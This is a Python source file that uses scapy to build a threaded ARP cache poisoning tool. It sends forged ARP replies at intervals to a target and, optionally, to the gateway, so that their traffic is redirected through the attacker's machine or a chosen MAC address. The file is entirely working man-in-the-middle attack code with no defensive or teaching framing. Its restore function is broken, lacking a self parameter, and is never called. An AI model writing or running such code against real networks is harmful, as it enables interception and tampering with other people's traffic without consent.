from scapy.all import ARP
from scapy.all import Ether
from scapy.all import srp
from scapy.all import send
import time
import threading
import logging

class ArpPoision():
    device_pool = [] # list of Thread(Poisioner) objects

    def __init__(self,setting):
        self.setting = setting
    
    def add(self, targetip: str, targetmac: str):
        poisioner = Poisioner(targetip, targetmac, self.setting)
        self.device_pool.append(poisioner)

    def start(self):
        # start arp poisioning threads

        for poisioner_thread in self.device_pool:
            poisioner_thread.start()

    def stop(self):
        
        for poisioner_thread in self.device_pool:
            poisioner_thread.running = False

        self.device_pool.clear()

class Poisioner(threading.Thread):
    running = False

    def __init__(self, targetip, targetmac, setting):
        threading.Thread.__init__(self)

        self.target_ip = targetip
        self.target_mac = targetmac
        self.setting = setting

    @staticmethod
    def getmac(targetip):
        targetmac = ""
        try:
            arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
            targetmac= srp(arppacket,timeout=2 , verbose= False)[0][0][1].hwsrc
            return targetmac
        except IndexError:
            logging.error('arp who-is failed')
            return targetmac

    def spoofarpcache(self, targetip, targetmac, sourceip, sourcemac=None):
        if sourcemac == None:
            spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
        else:
            spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwsrc=sourcemac, hwdst= targetmac)
        send(spoofed, verbose= False)

    def restorearp(targetip, targetmac, sourceip, sourcemac):
        logging.info('restoring arp cache poisioned devices')

        packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
        send(packet, verbose=False)

    def run(self):
        self.running = True

        logging.info('starting arp poision')
        logging.info(f'sending packets with {self.setting.time_interval}sec interval.')

        while self.running:
            if self.setting.hwsrc == None:
                # is-at field of arp will be this_pc_mac, and packets destined for the gateway will
                # insted be routed to this pc
                self.spoofarpcache(self.target_ip, self.target_mac, self.setting.gateway_ip)
                if self.setting.poision_gateway:
                    self.spoofarpcache(self.setting.gateway_ip, self.setting.gateway_mac, self.target_ip)
                
            else:
                # arp poisioned client will assume the owner of the macaddr self.hwsrc as the gateway
                self.spoofarpcache(self.target_ip, self.target_mac, self.setting.gateway_ip, sourcemac=self.setting.hwsrc)
                if self.setting.poision_gateway:
                    self.spoofarpcache(self.setting.gateway_ip, self.setting.gateway_mac, self.target_ip, 
                                        sourcemac=self.setting.hwsrc)
            print('arp sent to ',self.target_ip)
            time.sleep(self.setting.time_interval)

        logging.info('arp poision stopped')   